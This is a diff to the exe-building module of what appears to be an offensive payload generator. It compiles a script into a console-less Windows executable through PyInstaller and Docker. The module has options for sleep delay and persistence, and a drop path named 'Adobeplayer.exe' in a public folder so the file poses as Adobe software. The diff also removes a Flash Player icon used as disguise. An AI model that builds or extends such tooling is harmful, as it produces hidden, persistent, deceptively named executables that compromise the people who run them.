@@ -11,7 +11,6 @@ class exe_options(Moduleobject):
         ui.banner()
         self.values={'source':'',
                      'outfile':'%s'%(time.strftime('%m%Y')+str(random.randint(0,100))+'.exe'),
-                     'icon':'./icon/flashplayer.ico',
                      'sleep':'10',
                      'persistence':False,
                      'path':r'C:\\Users\\Public\\Libraries\\Adobeplayer.exe',
@@ -84,15 +83,26 @@ if __name__ == "__main__":
 
     def generate_exe(self):
         if os.path.isfile(self.output_script_name):
-            os.system('WINEPREFIX="$HOME/prefix32" wine ~/prefix32/drive_c/Python34/Scripts/pyinstaller.exe %s --onefile --noconsole --icon=%s --clean'
-                  %(self.output_script_name,self.values['icon']))
-            print('\033[92m'+'[*]'+'\033[0m'+'exe file was created succesfully ! ! ')
+            os.system('cd output;pyinstaller %s.py --noup --onefile --noconsole --clean;cd ..'
+                  %(self.values["outfile"]))
+            print('\033[92m'+'[*]'+'\033[0m'+'binary file was created succesfully ! ! ')
+
+
+    def docker_pack(self,file):
+        try:
+            os.makedirs("./output/src")
+        except FileExistsError:
+            print("src is exist, ")
+        shutil.move("./output/%s.spec"%file,"./output/src/")
+        shutil.copy("./output/%s.py"%file,"./output/src/")
+        os.system('cd output;cd src;docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows:python3-32bit;cd ..;cd ..')
+        shutil.copy("./output/src/dist/windows/%s"%file,"./output/")
+        shutil.rmtree('./output/src')
+        print('\033[92m' + '[*]' + '\033[0m' + 'exe file was created succesfully ! ! ')
 
     def clean_cache(self,file):
-        shutil.rmtree('./build')
-        os.remove('./%s.spec'%file)
-        shutil.copy('./dist/%s'%file,'./output/')
-        shutil.rmtree('./dist')
+        shutil.rmtree('./output/build')
+        shutil.rmtree('./output/dist')
         print('\033[92m' + '[*]' + '\033[0m' +"cache was cleaned")
 
     def run_action(self):
@@ -102,6 +112,8 @@ if __name__ == "__main__":
         time.sleep(2)
         print('-' * 50)
         self.generate_exe()
+        time.sleep(1)
+        self.docker_pack(self.values["outfile"])
         time.sleep(2)
         self.clean_cache(self.values['outfile'])
         input('type any key to continue')
